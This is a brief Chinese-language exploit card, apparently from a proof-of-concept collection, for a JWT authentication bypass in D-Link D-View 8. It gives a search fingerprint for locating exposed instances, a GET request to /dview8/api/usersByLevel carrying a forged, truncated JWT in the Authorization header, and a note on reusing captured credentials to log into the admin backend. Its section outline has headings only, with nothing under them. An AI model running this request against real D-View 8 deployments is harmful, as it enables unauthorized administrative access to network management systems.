# D-LinkD-View8JWT认证绕过漏洞

- **系统**：D-LinkD-View8JWT　|　**类型**：认证/授权绕过　|　**CVE**：—
- **指纹**：`title="D-View 8"`
- **请求**：`GET /dview8/api/usersByLevel HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Authorization: eyJhbGciOiAiSFMyNTYiLCJ0eXAiOiAiand0In0.eyJvcmdJZCI6ICIxMjM0…`

**请求体 / payload**
```

可通过获取的账号密码抓取登录数据包，替换用户名及加密密码后登录后台\
```

**其他**
- D-Link D-View 8 JWT认证绕过漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * D-Link D-View 8